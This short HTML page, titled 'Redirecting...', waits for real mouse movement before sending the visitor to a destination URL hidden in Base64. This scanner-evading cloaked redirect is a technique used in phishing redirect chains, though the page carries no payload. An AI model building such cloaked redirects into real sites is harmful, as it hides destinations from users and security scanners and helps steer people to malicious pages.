<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        let hasRedirected = false;

        function detectMouseMovement(event) {
            if (!hasRedirected) {
                // Check for natural mouse movement by analyzing properties like speed and direction
                if (event.movementX !== 0 || event.movementY !== 0) {
                    hasRedirected = true; // Prevent multiple redirects
                    redirectUser(); // Trigger the redirect
                }
            }
        }

        function redirectUser() {
            const encodedUrl = "aHR0cHM6Ly93d3cuZmluYWxkZXN0aW5hdGlvbi5jb20="; // Base64 encoded URL
            const decodedUrl = atob(encodedUrl); // Decode the URL
            window.location.href = decodedUrl; // Perform the redirect
        }

        document.addEventListener("mousemove", detectMouseMovement);
    </script>
</head>
<body>
    <p>Move your mouse to proceed to the next page.</p>
</body>
</html>
